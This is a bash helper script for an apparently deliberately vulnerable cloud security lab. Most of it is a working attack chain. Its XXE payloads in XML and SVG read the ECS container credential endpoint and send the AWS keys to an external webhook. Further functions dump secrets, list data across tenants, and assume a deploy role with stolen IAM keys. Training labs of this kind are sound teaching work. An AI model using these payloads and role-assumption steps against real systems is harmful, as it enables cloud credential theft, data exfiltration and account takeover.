#!/usr/bin/env bash
# =============================================================================
#  Cloud Security Lab — Lab Exercise Scripts
#  scripts/lab_helpers.sh
# =============================================================================
#
#  Source this file or run individual functions.
#  Requires: curl, aws-cli, jq
#
#  Usage (local Docker Compose stack):
#    source scripts/lab_helpers.sh
#    api_health
#    upload_normal_xml tenant-a lab-key-tenant-a
#    upload_xxe_payload tenant-a lab-key-tenant-a http://YOUR_WEBHOOK_SITE
#
# =============================================================================

API_BASE="${API_BASE:-http://localhost:8080}"

# ---------------------------------------------------------------------------
# Health check
# ---------------------------------------------------------------------------
api_health() {
  curl -sf "${API_BASE}/health" | jq .
}

# ---------------------------------------------------------------------------
# Normal XML upload (benign)
# ---------------------------------------------------------------------------
upload_normal_xml() {
  local tenant_id="${1:-tenant-a}"
  local api_key="${2:-lab-key-tenant-a}"

  cat > /tmp/normal_upload.xml <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<data version="1.0">
  <record id="1"><name>Alice</name><value>100</value></record>
  <record id="2"><name>Bob</name><value>200</value></record>
  <record id="3"><name>Carol</name><value>300</value></record>
</data>
EOF

  curl -s -X POST "${API_BASE}/upload" \
    -H "X-API-Key: ${api_key}" \
    -F "file=@/tmp/normal_upload.xml" | jq .
}

# ---------------------------------------------------------------------------
# Path 1 — XXE payload generator
# [VULN-1] Generates a malicious XML file that:
#   1. Declares an external entity pointing to the ECS IMDS credential endpoint
#   2. Uses a parameter entity to exfiltrate the credential JSON via HTTP GET
#      to an attacker-controlled webhook (OOB exfiltration)
#
# In a real ECS Fargate container:
#   http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}
#   returns: {"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"..."}
#
# The open ECS egress security group (all outbound) allows the outbound
# HTTP request to reach the external webhook endpoint.
#
# Usage: upload_xxe_payload tenant-a lab-key-tenant-a https://webhook.site/YOUR-ID
# ---------------------------------------------------------------------------
upload_xxe_payload() {
  local tenant_id="${1:-tenant-a}"
  local api_key="${2:-lab-key-tenant-a}"
  local webhook_url="${3:-https://webhook.site/REPLACE_ME}"

  cat > /tmp/xxe_payload.xml <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % creds_dtd SYSTEM "http://169.254.170.2\${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}">
  %creds_dtd;
  <!ENTITY % oob "<!ENTITY &#x25; exfil SYSTEM '${webhook_url}/?creds=%creds_dtd;'>">
  %oob;
  %exfil;
]>
<data version="xxe-test">
  <record>trigger</record>
</data>
EOF

  echo "[*] Uploading XXE payload for ${tenant_id}..."
  echo "[*] Credential exfiltration target: ${webhook_url}"
  echo "[*] Check your webhook dashboard after this request."
  echo ""

  curl -s -X POST "${API_BASE}/upload" \
    -H "X-API-Key: ${api_key}" \
    -F "file=@/tmp/xxe_payload.xml" | jq .
}

# ---------------------------------------------------------------------------
# SVG XXE variant (same attack via SVG file)
# ---------------------------------------------------------------------------
upload_svg_xxe_payload() {
  local tenant_id="${1:-tenant-a}"
  local api_key="${2:-lab-key-tenant-a}"
  local webhook_url="${3:-https://webhook.site/REPLACE_ME}"

  cat > /tmp/xxe_payload.svg <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY % creds_dtd SYSTEM "http://169.254.170.2\${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}">
  %creds_dtd;
  <!ENTITY % oob "<!ENTITY &#x25; exfil SYSTEM '${webhook_url}/?creds=%creds_dtd;'>">
  %oob;
  %exfil;
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <rect width="100" height="100" fill="red"/>
</svg>
EOF

  echo "[*] Uploading SVG XXE payload..."
  curl -s -X POST "${API_BASE}/upload" \
    -H "X-API-Key: ${api_key}" \
    -F "file=@/tmp/xxe_payload.svg" | jq .
}

# ---------------------------------------------------------------------------
# Cross-tenant enumeration (demonstrates VULN-2 after credential theft)
# In the real attack the attacker uses stolen AWS credentials directly
# against S3 — this endpoint just shows the same data via the app layer.
# ---------------------------------------------------------------------------
cross_tenant_list() {
  local api_key="${1:-lab-key-tenant-a}"
  echo "[*] Listing ALL tenant data (cross-tenant, no isolation)..."
  curl -s -X GET "${API_BASE}/admin/all-objects" \
    -H "X-API-Key: ${api_key}" | jq .
}

# ---------------------------------------------------------------------------
# Secrets dump (demonstrates Deploy Role over-permission / Path 2)
# ---------------------------------------------------------------------------
secrets_dump() {
  local api_key="${1:-lab-key-tenant-a}"
  echo "[*] Dumping all Secrets Manager values..."
  curl -s -X GET "${API_BASE}/lab/secrets-dump" \
    -H "X-API-Key: ${api_key}" | jq .
}

# ---------------------------------------------------------------------------
# Path 2 — Simulate attacker assuming Deploy Role with stolen IAM user creds
# Requires real AWS credentials — won't work against LocalStack by default.
# ---------------------------------------------------------------------------
simulate_path2_assume_role() {
  local stolen_key_id="${1}"
  local stolen_secret="${2}"
  local deploy_role_arn="${3:-arn:aws:iam::111122223333:role/sec-lab-deploy-role-prod}"

  if [[ -z "${stolen_key_id}" || -z "${stolen_secret}" ]]; then
    echo "Usage: simulate_path2_assume_role <ACCESS_KEY_ID> <SECRET_KEY> [ROLE_ARN]"
    return 1
  fi

  echo "[*] Attempting to assume Deploy Role using stolen IAM user credentials..."
  echo "[*] No MFA condition on trust policy — this should succeed from anywhere."

  AWS_ACCESS_KEY_ID="${stolen_key_id}" \
  AWS_SECRET_ACCESS_KEY="${stolen_secret}" \
  aws sts assume-role \
    --role-arn "${deploy_role_arn}" \
    --role-session-name "attacker-session-$(date +%s)" \
    --region eu-west-3 \
    | jq '{
        AccessKeyId:     .Credentials.AccessKeyId,
        SecretAccessKey: .Credentials.SecretAccessKey,
        SessionToken:    .Credentials.SessionToken,
        Expiration:      .Credentials.Expiration
      }'
}

echo "[sec-lab] Lab helper functions loaded."
echo "  api_health"
echo "  upload_normal_xml <tenant_id> <api_key>"
echo "  upload_xxe_payload <tenant_id> <api_key> <webhook_url>"
echo "  upload_svg_xxe_payload <tenant_id> <api_key> <webhook_url>"
echo "  cross_tenant_list <api_key>"
echo "  secrets_dump <api_key>"
echo "  simulate_path2_assume_role <key_id> <secret_key> [role_arn]"
